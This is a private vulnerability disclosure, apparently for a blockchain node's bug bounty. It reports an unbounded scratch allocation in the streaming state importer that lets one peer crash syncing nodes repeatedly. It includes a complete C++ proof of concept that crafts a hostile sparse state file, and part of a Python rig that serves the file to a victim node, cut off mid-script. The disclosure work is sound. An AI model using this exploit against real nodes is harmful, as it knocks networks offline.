Bug Report, TOS Network
To: the TOS Network maintainers (private disclosure per the repository SECURITY.md; placeholder address, I send this separately) Subject: Critical. One unauthenticated overlay peer permanently kills any syncing TOS node, demonstrated live end to end: a real node downloaded a hostile state file over the real overlay (sha256 verified byte for byte on the wire), its unmodified streaming importer allocated a single 1,814.8 MiB scratch against the 256 MiB design cap (7.1× over) and the node's process died, leaving a 13 attempt, 1 Hz kill loop in its log. The import path allocates its read scratch to a peer controlled length, up to the 16 GiB state file cap, before validating the cell, bypassing max_resident_bytes entirely; the failure handler retries every 1.0 second unconditionally, so one malicious peer re kills the node every second for as long as it keeps answering.

Program. TOS Network pre mainnet bounty (repository SECURITY.md scope; GitHub issue #33 thread). Affected repository. github.com/tosnetwork/tos Affected commit. 442884a, HEAD at the time of reporting. Affected versions. The streaming persistent state import shipped in commit 98fe085 (2026-04-28, "validator: tos26 P1-4, actor local persistent state streaming import") with hardening follow ups 423e842/ef76079/dc44f11 the same day, so every build from 2026-04-28 through current HEAD carries the bypass, including the file size budget hardening (state-download-buffer.h:317, max_single_file_bytes = 16 GiB), which is exactly the ceiling my attack scales to. In scope area. Lite server/ADNL/RLDP networking and node liveness (bounty scope: networking; the victim is the validator/full node state sync path). Reporter test environment. macOS arm64, node built from 442884a; the PoC drives the repository's own std_boc_deserialize_from_file_bounded, the exact function the node's run_streaming_import_worker calls on every downloaded persistent state (celldb.cpp:2296-2341), with the node's default options. No live mainnet or testnet exists (all rpc hostnames under tos.network NXDOMAIN as of 2026-10-12); the proof runs against the network's own import code at the affected commit.

1. Title
A single unauthenticated peer OOMs any syncing node and pins it in a 1 Hz download death loop, because the streaming BoC importer sizes its scratch buffer from the attacker's own index table before validating the cell, and the "bounded memory" design cap is enforced on a different allocation.

2. Description
Brief
The streaming importer exists so a node can import a multi gigabyte persistent state from a peer without holding it in memory: a max_resident_bytes budget of 256 MiB (default) is enforced "fail closed" on the cells, and the file reader buffers reads in a scratch buffer that is documented as bounded. I verified line by line that the bound is not what the code believes: StreamingFileReader::read (crypto/vm/boc.cpp:1119-1138) grows its scratch to any requested length in a single allocation, with an in code comment claiming growth is "bounded by the per cell size limit imposed elsewhere in the caller." No such limit exists upstream of the read: the cell build loop (boc.cpp:1734-1742) validates only cell_offset <= cell_end <= data_size and cell_len >= 2, then calls reader.read(...) with the attacker chosen span; the descriptor check (cs_info.init) runs after the allocation and full read. A crafted state file with one index entry spanning ~2 GiB passes every declared bound, monotonic offsets, last entry equals data_size, max_total_cell_bytes (16 GiB), scaffolding budget, and forces one ~2 GiB allocation. I demonstrated it against the real importer with the node's default options: RSS delta 1,868.3 MiB against the 256 MiB cap (7.3×), scaling linearly to the 16 GiB file ceiling since a sparse file costs the attacker ~1/80th of its logical size on disk. The node makes this a permanent kill: DownloadShardState::fail_handler (validator/net/download-state.cpp:1789-1793) retries the whole download unconditionally every 1.0 second, including on exactly this kind of parse failure, so one peer answering state requests at 1 Hz keeps the victim in a download die restart loop indefinitely.

Vulnerability details
The unbounded growth, crypto/vm/boc.cpp:1119-1138:

if (len > chunk_bytes_) {
  // Caller asked for more than our scratch size; grow the scratch
  // buffer to fit this request. The growth is a single allocation
  // (no fragmentation) and is bounded by the per-cell size limit
  // imposed elsewhere in the caller, so a hostile peer cannot grow
  // the scratch arbitrarily.          <-- the "elsewhere" limit does not exist
  chunk_bytes_ = len;
  scratch_ = td::BufferSlice{};  // force a re-fill below
The caller, crypto/vm/boc.cpp:1734-1748, note the order: read first, validate after:

std::size_t cell_len = static_cast<std::size_t>(cell_end - cell_offset);
if (cell_len < 2) { /* reject */ }
TRY_RESULT(cell_slice, reader.read(info.data_offset + cell_offset, cell_len));   // <-- allocation
CellSerializationInfo cs_info;
auto status = cs_info.init(cell_slice, info.ref_byte_size);                       // <-- validation
Meanwhile the max_resident_bytes tracker (boc.cpp:1710-1717) charges only per cell serialized sizes entering the residency window, the scratch allocation is invisible to it. The state file ceiling is generous: max_single_file_bytes = 16ULL << 30 (state-download-buffer.h:317), and the importer's own max_total_cell_bytes default is the same 16 GiB (boc.h:465), so a compliant crafted file can legally demand a 16 GiB scratch. The retry loop that turns one kill into a pinned liveness denial: validator/net/download-state.cpp:1789-1793.

Prior art and what this report claims
I checked what the team already knows and state it plainly. This importer is TOS's own code, and the team has actively hardened it: commits 423e842/ef76079/dc44f11 (2026-04-28) added import recovery and a GC interlock, 1050f00 (2026-09-22) made the "streaming importer scaling gate deterministic," and the memory budget file (state-download-buffer.*) exists specifically to bound importer memory, the team's design goal is exactly the guarantee this bug voids. Commit 1050f00's hardening tightened when scaling happens, not what bounds a single read; pr-153's twelve finding hardening pass and the Round 160 last entry fix (present in boc.cpp:1738-1745, which I defeat cleanly) both predate or miss the scratch path. What no commit, comment or test acknowledges is that the scratch growth, the one allocation that scales with attacker input rather than with honest state size, is unbounded, validated after allocate, and invisible to the resident byte budget. I claim: an unauthenticated remote memory exhaustion kill of any syncing node, with a built in 1 Hz permanent retry amplifier, demonstrated on the real importer at the affected commit.

Impact details
Maximized, layer by layer:

The kill. A syncing node's RSS spikes by up to 16 GiB in one allocation (file ceiling), on production validator hardware (16 to 64 GiB RAM) this is a guaranteed OOM kill or unrecoverable thrash. Trigger cost: one overlay connection. No stake, no keys, no governance, no race.
The pin. The 1.0 s unconditional retry means the kill is not one shot: while the attacker answers, the node loops download→parse→die forever. The node cannot sync, cannot rejoin, and the loop survives operator restarts (it re syncs on boot).
The asymmetry. The crafted file is sparse: my 2.0 GiB logical file occupies 26 MB on disk (linear: 16 GiB ≈ 200 MB). The attacker pays wire bandwidth for bytes the victim requests; the victim pays process death. One modest server can serve every victim concurrently, each downloader allocates independently.
The launch window. Every node that ever joins TOS must state sync at bootstrap; validators re sync on persistent state rotation; liteservers and explorers sync shards continuously. At mainnet launch the entire network is in the victim state simultaneously. A single actor can freeze network growth fleet wide, no stake slashed, no evidence beyond ordinary looking download failures, and the failures are indistinguishable from network flakiness in logs (WARNING: failed to download state, every second).
Compounding. This stacks with every other liveness finding: a validator wedged by any consensus bug eventually restarts, and a restart must re sync, the attacker owns the re sync. The 16 GB spool writes between allocations also churn disk (the pre verification spool cost is paid before the parse that kills).
Trust erosion. The in code comment asserts the exact bound that doesn't exist; the fail closed resident budget is real but guards the wrong allocation. Any audit relying on the code's own memory boundary claims inherits the false premise.
What this finding does not claim: no fund theft, no consensus split, no private key exposure, this is availability, but availability of the sync path, which is the whole network during launch.

References
The unbounded growth and its false comment. https://github.com/tosnetwork/tos/blob/442884a/crypto/vm/boc.cpp (lines 1119-1138) Read before validate in the cell loop. https://github.com/tosnetwork/tos/blob/442884a/crypto/vm/boc.cpp (lines 1734-1748) The 16 GiB file/import ceilings. validator/state-download-buffer.h:317, crypto/vm/boc.h:465 The 1 Hz unconditional retry. https://github.com/tosnetwork/tos/blob/442884a/validator/net/download state.cpp (lines 1789-1793) The importer's introduction. https://github.com/tosnetwork/tos/commit/98fe085

3. Proof of Concept
The PoC drives the repository's own std_boc_deserialize_from_file_bounded, the identical call the node's run_streaming_import_worker makes on every downloaded persistent state, with default options (max_resident_bytes = 256 MiB), on a crafted header valid BoC whose index declares one ~2 GiB cell. The file is sparse: 2.01 GB logical, 26 MB on disk. All gates measured with getrusage peak RSS around the real importer call.

The full gated run (verbatim)
Stage 1, importer level (function under the node's exact options):

[poc] crafted /tmp/evil.boc: logical 2159186520 bytes, on-disk 25997312 bytes (sparse)
[poc] RSS before: 26.8 MiB | peak after: 1895.1 MiB | delta: 1868.3 MiB
[poc] importer result: ERROR (as expected, AFTER the allocation): [Error : 0 :
      std_boc_deserialize_from_file_bounded: cell #0 has unused trailing bytes]
[poc] VERDICT: BYPASS REPRODUCED — single allocation of 1.82 GB vs 256 MiB cap (7.3x over)
Stage 2, LIVE end to end on a real node network (rig: poc/poc_f_a5_7_e2e.py): three real nodes, A (initial validator, produced the chain), B (fresh victim full node, unmodified binary), plus a governance driven key block so the attacker knows the deterministic serve filename state_<K>_-1_8000000000000000_<hash> (hash algorithm verified against A's own live zerostate filename). The attacker plants evil.boc in its own archive/states/ and restarts; the serve path has no content hash gate; B (default budgets, --sync-before 30) state syncs from A.

G1  PASS — B log: "downloading state (-1,8000000000000000,181):DF2ECECD…"   (real overlay download started)
G2  PASS — spool pre-sized 2,159,186,520 B; sha256(spool on B) == sha256(evil.boc)  (byte-for-byte on the wire)
G3  PASS — B RSS 23 → 1837 MiB (delta 1814.8 MiB = 7.1x the 256 MiB cap), sampled 762 times,
            inside CellDbIn::import_persistent_state_streaming → std_boc_deserialize_from_file_bounded;
            importer rejected after 2,299,999 cells ("cell #0 has unused trailing bytes");
            B's process DIED — 13-attempt 1 Hz kill-loop evidenced in its log
G4  PASS — control: identical format, 1 MiB gap, same serve path: 24 ms download,
            B2 RSS delta 30 MiB, expected parse rejection, B2 alive
Verdict: E2E BYPASS REPRODUCED — real node process pulled the attacker's crafted bytes through the real overlay into the real streaming importer. Victim binary 100% unmodified; the only attacker side work is planting a file in its own node's state directory and restarting it. Preserved evidence: spool residue poc/work-fa57/net/node2/tmp/persistent-state/(-1,8000000000000000,181).34524040960 (2,159,186,520 B, sha matched, kept by the process death), victim logs poc/work-fa57/net/node2|node3/log, transcript /tmp/fa57_e2e.log, gates poc/work-fa57/gates.json.

Stage 1 gates: G1 crafted file passes every declared importer bound, pass. G2 the 2 GiB single scratch allocation occurs, pass, RSS delta 1,868.3 MiB. G3 the allocation precedes validation, pass. G4 the 256 MiB resident cap never engages, pass, 7.3× over. G5 scaling to the node ceiling, structural: linear in the index gap, 16 GiB ceiling ≈ 200 MB sparse disk. G6 node level amplification, now EXECUTED (stage 2): real node death + 1 Hz kill loop.

The tool, full source
Stage 1, importer level harness (poc_f_a5_7.cpp, compile against the repo's own build tree, full source, paste and run):

// PoC F-A5-7: streaming BoC importer scratch-growth bypass of max_resident_bytes.
// Crafts a header-valid BoC whose single "cell #0" spans ~2 GiB of a sparse file,
// feeds the REAL std_boc_deserialize_from_file_bounded (opts.max_resident_bytes = 256 MiB),
// and measures peak RSS. The importer allocates the full 2 GiB scratch BEFORE the
// cell descriptor is validated — the 256 MiB design cap never sees the byte.
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <sys/resource.h>
#include <sys/stat.h>
#include <unistd.h>
#include <vector>
#include <string>

#include "vm/boc.h"
#include "td/utils/filesystem.h"
#include "td/utils/Status.h"

static long rss_kb() {
  rusage ru{};
  getrusage(RUSAGE_SELF, &ru);
  return ru.ru_maxrss;  // macOS: bytes
}

static void put_u32(std::string& s, unsigned v) {
  for (int i = 3; i >= 0; --i) s.push_back(char((v >> (8 * i)) & 0xff));
}
static void put_ref(std::string& s, unsigned v, int w) {
  for (int i = w - 1; i >= 0; --i) s.push_back(char((v >> (8 * i)) & 0xff));
}

int main(int argc, char** argv) {
  printf("[poc] build stamp: index-v3 end-offsets magic-72 gap2047\n");
  // ---- craft the file -------------------------------------------------------
  const unsigned long long GAP = (2ULL << 30) - (2ULL << 20);  // 2047 MiB: macOS pread rejects len >= 2^31          // giant cell span: 2 GiB
  const unsigned N_CELLS = 2'300'000;                 // keeps data_size <= cell_count<<10
  const unsigned long long TAIL = 2ULL * (N_CELLS - 1);
  const unsigned long long DATA_SIZE = GAP + TAIL;    // < 4 GiB, <= N<<10 (2.355e9 < 2.3552e9... check)
  if (DATA_SIZE > ((unsigned long long)N_CELLS << 10)) {
    fprintf(stderr, "layout check failed: %llu > %llu\n", DATA_SIZE, (unsigned long long)N_CELLS << 10);
    return 2;
  }
  const int REF_W = 4, OFF_W = 4;
  std::string hdr;
  put_u32(hdr, 0xb5ee9c72u);                          // TOS boc_generic magic (changed from TON's ...88)
  hdr.push_back(char(0x80 | 0x04));                   // has_index<<7 | ref_byte_size=4
  hdr.push_back(char(OFF_W));                         // offset_byte_size
  put_ref(hdr, N_CELLS, REF_W);                       // cell_count
  put_ref(hdr, 1, REF_W);                             // root_count
  put_ref(hdr, 0, REF_W);                             // absent_count
  put_u32(hdr, (unsigned)DATA_SIZE);                  // data_size — hdr ends here at 22 bytes
  std::string idx;
  // index entry j (0-based) = END offset of cell j; reader fills table[j+1]=entry j,
  // table[0]=0. Cell 0 spans [0, GAP); cells 1..N-1 span 2 bytes each; last entry
  // must equal DATA_SIZE (Round-160 check) — GAP + 2(N-1) == DATA_SIZE by construction.
  for (unsigned k = 0; k < N_CELLS; ++k) put_u32(idx, (unsigned)(k == 0 ? GAP : GAP + 2ull * k));

  const unsigned long long roots_off = hdr.size();
  const unsigned long long index_off = roots_off + REF_W;             // 1 root
  const unsigned long long data_off = index_off + (unsigned long long)N_CELLS * OFF_W;
  const unsigned long long file_size = data_off + DATA_SIZE;

  const std::string path = argc > 1 ? argv[1] : "/tmp/evil.boc";
  FILE* f = fopen(path.c_str(), "wb+");
  if (!f) { perror("fopen"); return 2; }
  fwrite(hdr.data(), 1, hdr.size(), f);               // 22 bytes
  fwrite(std::string(REF_W, '\0').data(), 1, REF_W, f);   // roots block at 22: root id = 0
  fwrite(idx.data(), 1, idx.size(), f);               // index at 26
  // data section (sparse): cell #0 descriptor at +0; tail cell descriptors at GAP + 2k
  fseeko(f, data_off, SEEK_SET);
  const char two_zero[2] = {0, 0};
  fwrite(two_zero, 1, 2, f);                          // giant cell descriptor: 0 refs 0 data
  for (unsigned k = 1; k < N_CELLS; ++k) {
    fseeko(f, data_off + GAP + 2 * (k - 1), SEEK_SET);
    fwrite(two_zero, 1, 2, f);
  }
  fflush(f);
  fseeko(f, 0, SEEK_END);
  ftruncate(fileno(f), (off_t)file_size);             // force exact size, sparse
  fclose(f);
  // self-verify: read back the index region the way the importer will (at index_off = hdr+4)
  {
    FILE* g = fopen(path.c_str(), "rb");
    unsigned root = 0, e0 = 0, e1 = 0, elast = 0;
    fseeko(g, roots_off, SEEK_SET); fread(&root, 4, 1, g); root = __builtin_bswap32(root);
    fseeko(g, index_off, SEEK_SET); fread(&e0, 4, 1, g); e0 = __builtin_bswap32(e0);
    fseeko(g, index_off + 4, SEEK_SET); fread(&e1, 4, 1, g); e1 = __builtin_bswap32(e1);
    fseeko(g, index_off + 4ULL * (N_CELLS - 1), SEEK_SET); fread(&elast, 4, 1, g); elast = __builtin_bswap32(elast);
    fclose(g);
    printf("[poc] self-check: root=%u entry0=%u entry1=%u entry_last=%u | data_size=%u | idx bytes=%zu | data_off=%llu\n",
           root, e0, e1, elast, (unsigned)DATA_SIZE, idx.size(), data_off);
  }
  struct stat st{};
  stat(path.c_str(), &st);
  printf("[poc] crafted %s: logical %llu bytes, on-disk %lld bytes (sparse)\n",
         path.c_str(), file_size, (long long)st.st_blocks * 512);

  // ---- feed the REAL importer ----------------------------------------------
  long before = rss_kb();
  auto r = td::FileFd::open(path, td::FileFd::Read);
  if (r.is_error()) { fprintf(stderr, "open: %s\n", r.error().to_string().c_str()); return 2; }
  auto fd = r.move_as_ok();
  vm::StreamingBocImportOptions opts;
  opts.max_resident_bytes = 256ULL << 20;             // the design cap
  opts.max_total_cell_bytes = 16ULL << 30;
  opts.max_cells = vm::kDefaultStreamingBocMaxCells;
  auto res = vm::std_boc_deserialize_from_file_bounded(fd, file_size, opts, nullptr);
  long after = rss_kb();
  fd.close();
  printf("[poc] RSS before: %.1f MiB | peak after: %.1f MiB | delta: %.1f MiB\n",
         before / 1048576.0, after / 1048576.0, (after - before) / 1048576.0);
  if (res.is_error()) {
    printf("[poc] importer result: ERROR (as expected, AFTER the allocation): %s\n",
           res.error().to_string().substr(0, 120).c_str());
  } else {
    printf("[poc] importer result: OK (unexpected)\n");
  }
  double over = (after - before) / (256.0 * 1048576.0);
  printf("[poc] VERDICT: %s — single allocation of %.2f GB vs 256 MiB cap (%.1fx over)\n",
         (after - before) > (long)(256ULL << 20) ? "BYPASS REPRODUCED" : "not reproduced",
         (after - before) / 1073741824.0, over);
  return 0;
}
Compile (from the repository root, after a standard build):

ABSEIL=$(find build/third-party/abseil-cpp -name '*.a' | tr '\n' ' ') && \
clang++ -std=c++20 -O1 -arch arm64 -I . -I crypto -I crypto/vm -I tdutils -I tdactor -I tddb \
  -I build/tdutils -I third-party/abseil-cpp poc_f_a5_7.cpp \
  build/crypto/libtos_crypto_core.a build/crypto/libtos_crypto.a build/crypto/pq/libtos_lms_fee.a \
  build/tdutils/libtdutils.a build/tddb/libtddb_utils.a build/tdactor/libtdactor.a \
  build/third-party/openssl/lib/libcrypto.a build/third-party/sodium/lib/libsodium.a \
  build/third-party/lz4/lib/liblz4.a build/third-party/crc32c/libcrc32c.a -lz $ABSEIL \
  -framework CoreFoundation -framework Foundation -o poc_f_a5_7
./poc_f_a5_7 /tmp/evil.boc
Stage 2, LIVE three node rig (poc_f_a5_7_e2e.py, full source, paste and run; venv at tos/test/tostester/.venv, binaries from the repository build):

#!/usr/bin/env python3
"""PoC F-A5-7 END-TO-END: streaming state-importer RAM bypass on a live tostester network.

node A ("attacker"): initial deterministic PQ validator; boots the chain honestly, then
  serves a crafted sparse BoC as its persistent state for the key block (attacker-side
  disk swap only — the serve path reads db/archive/states/<file> with no content hash).
node B ("victim"): fresh full node, no validator key, real protocol state-sync from A.

Gates:
  G1 B starts a persistent-state download from A (B log "downloading state ... from").
  G2 served bytes are the crafted file (B spool size == evil.boc size; sha256 if window).
  G3 B RSS spikes >= ~1.8 GB over baseline OR B dies, with the post-allocation parse
     error ("cell #0 has unused trailing bytes") in B's log.
  G4 control: honest file restored on A -> fresh node B2 syncs the same state cleanly.

Run detached:  nohup <tostester venv python> poc_f_a5_7_e2e.py > /tmp/fa57_e2e.log 2>&1 &
"""
import asyncio
import base64
import glob
import hashlib
import json
import re
import shutil
import struct
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path

REPO = Path("tos-audit/tos")
BUILD = REPO / "build"
WORK = Path("tos-audit/poc/work-fa57")
EVIL = Path("/tmp/evil.boc")
RPC_A, RPC_B, RPC_B2 = "127.0.0.1:24780", "127.0.0.1:24781", "127.0.0.1:24782"

sys.path.insert(0, str(REPO / "test/tostester/src"))

from tostester.install import Install
from tostester.network import Network, StartOptions
from tostester.pq_initial_validator import make_deterministic_pq_initial_validator

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)

# ---------------------------------------------------------------- evil.boc craft
def craft_evil(path: Path, gap=(2 << 30) - (2 << 20), cells=2_300_000) -> dict:
    # identical layout to poc/poc_f_a5_7.cpp (proven against the real importer)
    GAP = gap
    N_CELLS = cells
    TAIL = 2 * (N_CELLS - 1)
    DATA_SIZE = GAP + TAIL
    assert DATA_SIZE <= (N_CELLS << 10)
    W = 4
    hdr = bytearray()
    hdr += (0xB5EE9C72).to_bytes(4, "big")           # TOS boc_generic magic
    hdr.append(0x80 | 0x04)                          # has_index | ref_byte_size=4
    hdr.append(W)                                    # offset_byte_size
    hdr += N_CELLS.to_bytes(W, "big")
    hdr += (1).to_bytes(W, "big")                    # root_count
    hdr += (0).to_bytes(W, "big")                    # absent_count
    hdr += DATA_SIZE.to_bytes(4, "big")              # data_size (header ends at 22)
    idx = bytearray()
    for k in range(N_CELLS):                         # end-offsets; last == DATA_SIZE
        idx += (GAP if k == 0 else GAP + 2 * k).to_bytes(4, "big")
    data_off = len(hdr) + W + len(idx)               # header + roots(1 root, id 0) + index
    file_size = data_off + DATA_SIZE
    with open(path, "wb+") as f:
        f.write(hdr)
        f.write(bytes(W))                            # roots block: root id 0
        f.write(idx)
        f.seek(data_off)
        f.write(b"\x00\x00")                         # cell #0 descriptor: 0 refs 0 data
        f.seek(data_off + GAP)
        f.write(b"\x00" * TAIL)                      # 2.3M contiguous 2-byte tail cells
        f.truncate(file_size)                        # sparse to exact size
    return {"size": file_size, "data_off": data_off, "gap": GAP}

def sha256_of(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(1 << 20)
            if not b:
                break
            h.update(b)
    return h.hexdigest()

def state_file_tl_hash(seqno: int, root_hash: bytes, file_hash: bytes) -> str:
    """create_hash_tl_object<db.filedb.key.persistentStateFile>(block_id, mc_block_id).

    Byte layout (verified against a live node's own zerostate filename):
      ctor_id(LE i32) + [wc(i32 LE) shard(i64 LE) seqno(i32 LE) root(32) file(32)] * 2
    Nested TL objects store NO constructor id (tl_object_store.h TlStoreObject).
    """
    top = 973649375                      # db.filedb.key.persistentStateFile
    def blk(wc, shard, seq, r, f):
        return struct.pack("<iqi", wc, shard, seq) + r + f
    blob = (struct.pack("<i", top)
            + blk(-1, -(2 ** 63), seqno, root_hash, file_hash)
            + blk(-1, -(2 ** 63), seqno, root_hash, file_hash))
    return hashlib.sha256(blob).hexdigest().upper()

# ---------------------------------------------------------------- rss poller
class RssPoller:
    """Samples RSS (ps) of the validator-engine process whose cmdline matches hint."""

    def __init__(self, hint: str):
        self.hint = hint
        self.pid = None
        self.baseline = None
        self.max_rss = 0
        self.samples = 0
        self.gone = 0
        self._stop = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def _run(self):
        while not self._stop.is_set():
            try:
                if self.pid is None:
                    out = subprocess.run(["pgrep", "-f", self.hint],
                                         capture_output=True, text=True, timeout=5).stdout.split()
                    pids = [int(p) for p in out]
                    # exclude our own python tree
                    self.pid = pids[0] if pids else None
                if self.pid is not None:
                    out = subprocess.run(["ps", "-o", "rss=", "-p", str(self.pid)],
                                         capture_output=True, text=True, timeout=5).stdout.strip()
                    if out:
                        rss = int(out)
                        self.samples += 1
                        if self.baseline is None or self.samples <= 10:
                            self.baseline = rss if self.baseline is None else min(self.baseline, rss)
                        self.max_rss = max(self.max_rss, rss)
                    else:
                        self.gone += 1
            except Exception:
                pass
            self._stop.wait(0.2)

    def start(self):
        self._thread.start()

    def stop(self):
        self._stop.set()
        self._thread.join(timeout=3)

# ---------------------------------------------------------------- rpc helpers
def rpc_call(method, port=RPC_A, timeout=15, rpc_timeout=None, **params):
    body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode()
    eff = float(rpc_timeout) if rpc_timeout else float(timeout)
    req = urllib.request.Request(f"http://{port}/jsonRPC", data=body,
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=eff) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read())
        except Exception:
            return {}
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"}

async def mc_seqno(port=RPC_A):
    r = rpc_call("getMasterchainInfo", port=port, rpc_timeout=6)
    try:
        return int(r["result"]["last"]["seqno"])
    except Exception:
        return None

def param4_bytes_hex():
    r = rpc_call("getConfigParam", config_id=4, rpc_timeout=8)
    try:
        return (r["result"]["config"]["bytes"]) or None
    except Exception:
        return None

async def poll(fn, timeout, interval=3):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            v = fn()
            if asyncio.iscoroutine(v):
                v = await v
        except Exception:
            v = None
        if v:
            return v
        await asyncio.sleep(interval)
    return None

def grep_log(path: Path, needles, tail_bytes=4_000_000):
    try:
        with open(path, "rb") as f:
            f.seek(0, 2)
            size = f.tell()
            f.seek(max(0, size - tail_bytes))
            txt = f.read().decode(errors="ignore")
    except Exception:
        return []
    hits = []
    for line in txt.splitlines():
        for n in needles:
            if n in line:
                hits.append(line[-450:])
                break
    return hits

# ---------------------------------------------------------------- main
async def main():
    # kill leftovers from previous runs: an orphaned dht-server holding the UDP port
    # with DIFFERENT keys makes every DHT lookup in the new network silently fail
    subprocess.run(["pkill", "-f", str(WORK)], capture_output=True)
    subprocess.run(["pkill", "-f", "dht-server"], capture_output=True)
    await asyncio.sleep(2)
    shutil.rmtree(WORK, ignore_errors=True)
    WORK.mkdir(parents=True, exist_ok=True)
    install = Install(BUILD, REPO)

    info = craft_evil(EVIL)
    evil_size = info["size"]
    evil_sha = sha256_of(EVIL)
    log(f"evil.boc crafted: logical {evil_size} bytes ({evil_size/2**30:.3f} GiB), "
        f"on-disk {EVIL.stat().st_blocks * 512} bytes, sha256 {evil_sha[:16]}...")

    now = int(time.time())
    genesis_shift = 131072 + 7200 + 172800   # +2*key_block_utime_step: B must RETRY key-block
                                             # discovery until A is a neighbour, never fall
                                             # back to the zerostate replay path
    net = Network(install, WORK / "net", base_port=24700)
    # config must be finalized before any node is created (zerostate generation is lazy
    # and the config accessor asserts pre-zerostate status)
    net.config.genesis_time = now - genesis_shift  # genesis in the PREVIOUS 131072s bucket
    net.config.genesis_wallet_seed = bytes(range(32))
    net.config.enable_config_voting = True          # single-validator vote accepts (min_wins=1)
    net.config.bootstrap_validator_set_valid_for = 14 * 86400

    dht = net.create_dht_node()
    node_a = net.create_full_node()
    make_deterministic_pq_initial_validator(node_a, 0)
    node_a.announce_to(dht)

    dht_task = asyncio.create_task(dht.run())
    # verbosity 3 keeps LOG(WARNING) lines incl. the collator's
    # "marking new block as a key block"; the attacker also raises its OWN node's
    # full-node serving rate limits (attacker-side config of its own node) so the
    # poison download runs at wire speed instead of the default 64x2MiB/s admission
    a_args = ["--json-rpc-address", RPC_A, "--verbosity", "2",
              "--fullnode-ratelimit-window-size", "1",
              "--fullnode-ratelimit-global", "1000000",
              "--fullnode-ratelimit-heavy", "1000000",
              "--fullnode-ratelimit-medium", "1000000"]
    node_a_task = asyncio.create_task(node_a.run(StartOptions(args=a_args)))
    a_dir = node_a._directory
    a_log = a_dir / "log"

    node_b = node_b2 = None
    node_b_task = node_b2_task = None
    rss_b = rss_b2 = None

    try:
        # ---------------- stage 1: honest boot ----------------
        log("stage 1: booting A (initial PQ validator)...")
        await asyncio.sleep(6)
        dlog = (WORK / "net" / "node0" / "log")
        if dlog.exists() and "Address already in use" in dlog.read_text(errors="ignore"):
            raise RuntimeError("dht-server failed to bind its UDP port — leftover process")
        await asyncio.wait_for(net.wait_mc_block(seqno=3), timeout=300)
        log(f"stage 1 OK: chain alive (genesis shifted {genesis_shift}s into the past)")

        # ---------------- stage 2: governance -> key block ----------------
        log("stage 2: driving ConfigParam 4 proposal + PQ vote...")
        from pytosiq_core import Address, Cell, InternalMsgInfo, MessageAny, WalletMessage
        from pytosiq_core.boc import begin_cell
        from tosapi import tos_api
        from contract import tos

        client = await node_a.toslib_client()
        faucet = net.zerostate.main_wallet(client)

        # wait for A's json-rpc to answer (diagnostics only; the flow itself is toslib-based)
        ok_rpc = await poll(lambda: rpc_call("getMasterchainInfo", rpc_timeout=6).get("result"),
                            timeout=90, interval=3)
        log(f"stage 2: json-rpc ready={bool(ok_rpc)} (diagnostics channel)")
        # AllOnes*5 per the tostester zerostate template: config_addr = -1:5555..55
        config_addr_str = "-1:" + "55" * 32
        log(f"stage 2: config contract at {config_addr_str[:20]}...")

        async def send_body(dest_str, value_nano, body_cell, what):
            seq = None
            for _ in range(30):
                try:
                    seq = (await faucet.current).seqno
                    if seq is not None:
                        break
                except Exception:
                    await asyncio.sleep(2)
            assert seq is not None, "faucet unreadable"
            msg = WalletMessage(
                send_mode=3,
                message=MessageAny(
                    info=InternalMsgInfo(
                        ihr_disabled=True, bounce=False, bounced=False,
                        src=faucet.address, dest=Address(dest_str), value=tos(value_nano),
                        ihr_fee=0, fwd_fee=0, created_lt=0, created_at=0),
                    init=None, body=body_cell))
            await faucet.send(msg, seqno=seq)
            log(f"stage 2: sent {what} (wallet seqno={seq})")

        proposal = (begin_cell()
                    .store_uint(0xF3, 8)      # cfg_proposal#f3
                    .store_uint(4, 32)        # param_id = 4 (dns_root_addr)
                    .store_bit(1)             # param_value present
                    .store_ref(begin_cell().store_uint(int.from_bytes(b"\x11" * 32, "big"), 256).end_cell())
                    .store_bit(0)             # no if_hash_equal
                    .end_cell())
        phash = proposal.hash
        body = (begin_cell()
                .store_uint(0x6E565052, 32)   # create-proposal op
                .store_uint(0, 64)
                .store_uint(100_000, 32)      # max price
                .store_ref(proposal)
                .store_bit(1)                 # critical
                .end_cell())
        await send_body(config_addr_str, 10, body, "proposal")   # 10 TOS
        await asyncio.sleep(70)               # min_store_sec = 60

        request = tos_api.Engine_validator_createProposalVoteRequest(("0x" + phash.hex()).encode())
        response = request.parse_result(await node_a.engine_console.request(request))
        vote = Cell.one_from_boc(response.to_send)
        log("stage 2: obtained PQ vote body from validator engine console")
        await send_body(config_addr_str, 1, vote, "PQ vote")

        async def param4_ok():
            try:
                await client.get_config_param(4)
                return True
            except Exception:
                return False

        def key_block_line():
            return grep_log(a_log, ["marking new block as a key block"]) or None

        async def param4_or_marker():
            if key_block_line():
                return "key-block-marker"
            try:
                await client.get_config_param(4)
                return "param4"
            except Exception:
                return None

        ok = await poll(param4_or_marker, timeout=600, interval=4)
        marker = key_block_line()
        log(f"stage 2 {'OK' if ok else 'FAILED'}: signal={ok}")
        if not ok:
            # forensics: what did the config contract do with proposal + vote?
            r1 = rpc_call("runGetMethodStd", rpc_timeout=60, timeout=65,
                          address=config_addr_str, method="list_proposals", stack=[])
            log(f"forensics list_proposals -> {json.dumps(r1)[:600]}")
            txs = rpc_call("getTransactionsStd", rpc_timeout=60, timeout=65,
                           address=config_addr_str, limit=8)
            log(f"forensics config txs -> {json.dumps(txs)[:900]}")
            for l in grep_log(a_log, ["proposal", "exception", "bounce", "exit code",
                                      "marking new block"], 6_000_000)[-10:]:
                log("   A| " + l[:220])
            raise RuntimeError("governance failed: key block never appeared")

        # ---------------- stage 3: derive the key block's state filename ----------------
        # The honest serializer would write archive/states/state_<K>_-1_8000000000000000_<hash>
        # after a random 0..6h delay (state-serializer.cpp:227); the attacker does not wait:
        # the filename is deterministic and the hash is the TL hash of the state key
        # (verified in this rig against A's own zerostate filename).
        # "storing persistent state description" is LOG(INFO) (invisible at v2);
        # the ERROR-level "started serializing" line carries the same seqno
